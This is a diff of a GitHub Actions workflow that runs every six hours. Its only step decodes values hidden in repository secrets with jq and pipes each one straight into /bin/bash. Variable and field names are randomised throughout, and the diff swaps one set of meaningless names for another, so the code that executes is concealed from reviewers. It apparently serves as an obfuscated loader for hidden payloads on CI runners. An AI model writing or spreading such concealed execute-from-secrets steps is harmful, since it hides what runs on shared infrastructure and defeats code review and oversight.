@@ -2,8 +2,9 @@ name: juekaic
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 4/6 * * *'
-jobs:  # 21724
+    - cron: '38 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,18 +12,13 @@ jobs:  # 21724
       - uses: actions/checkout@v4
       - name: juekaic
         env:
-          ykcj51: ${{ secrets.ykcj51 }}
+          pu977: ${{ secrets.pu977 }}
         run: |
-          echo $ykcj51 | jq -r .ko41884 | /bin/bash
-          echo $xp8948 | jq -r .iqc69 | /bin/bash
-          echo $z65 | jq -r .ntvi75123 | /bin/bash
-          echo $es4869 | jq -r .em1 | /bin/bash
-          echo $zsbf427 | jq -r .bwwgy0392 | /bin/bash
-          echo $ez45083 | jq -r .khqka79 | /bin/bash
-          echo $bjjmj52 | jq -r .pco58 | /bin/bash
-          echo $ibit440 | jq -r .nuc6741 | /bin/bash
-          echo $nste03 | jq -r .tbm73438 | /bin/bash
-          echo $i547 | jq -r .vjl99676 | /bin/bash
-          echo $k7 | jq -r .l69575 | /bin/bash
-          echo $zhi14776 | jq -r .vsmq34 | /bin/bash
+          echo $pu977 | jq -r .kwfy1523 | /bin/bash
+          echo $gq27 | jq -r .hvh37706 | /bin/bash
+          echo $argr2 | jq -r .mpod1 | /bin/bash
+          echo $jul71121 | jq -r .fxijv8 | /bin/bash
+          echo $um2 | jq -r .nc6802 | /bin/bash
+          echo $rlx064 | jq -r .vtaf0 | /bin/bash
+          echo $jpfn9167 | jq -r .syjp26554 | /bin/bash
 
